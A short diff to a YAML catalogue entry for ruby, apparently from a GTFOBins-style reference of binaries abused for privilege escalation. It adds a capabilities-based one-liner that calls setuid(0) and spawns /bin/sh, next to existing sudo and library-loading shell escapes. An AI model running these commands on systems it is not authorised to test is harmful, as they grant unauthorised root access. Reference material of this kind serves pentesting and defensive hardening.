@@ -29,4 +29,6 @@ functions:
     - code: ruby -e 'require "fiddle"; Fiddle.dlopen("lib.so")'
   sudo-enabled:
     - code: sudo ruby -e 'exec "/bin/sh"'
+  capabilities-enabled:
+    - code: ./ruby -e 'Process::Sys.setuid(0); exec "/bin/sh"'
 ---
